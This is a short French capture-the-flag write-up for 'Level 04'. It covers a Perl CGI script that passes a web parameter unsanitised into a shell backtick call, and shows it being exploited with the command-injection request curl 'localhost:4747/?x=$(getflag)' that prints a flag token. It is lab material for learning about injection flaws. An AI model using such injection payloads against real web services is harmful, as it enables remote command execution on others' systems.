# Level 04

1) Un coup de `ls` et nous avons un fichier `level04.pl`.

2) le code ressemble a ca :

```bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Voici ce qui se passe quand on l'execute:

```bash
./level04.pl
Content-type: text/html
```

3) Pour expliquer ce que fait en detail le programme, il importe `param` qui lit sur le port `4747` qui est ouvert. Ensuite ce qui est lu est envoye comme argument a `x()`. Le resultat est ensuite stocke dans `$y`. Puis de la meme maniere que dans l'exercise precedent, le programme utilise `echo` pour afficher `$y`
    
4) bref tout ca pour dire qu'il suffit de mettre getflag sur le port 4747 pour que le programme perl le lance pour nous et donne le resultat:
    - curl 'localhost:4747/?x=$(getflag)'

```bash
curl 'localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
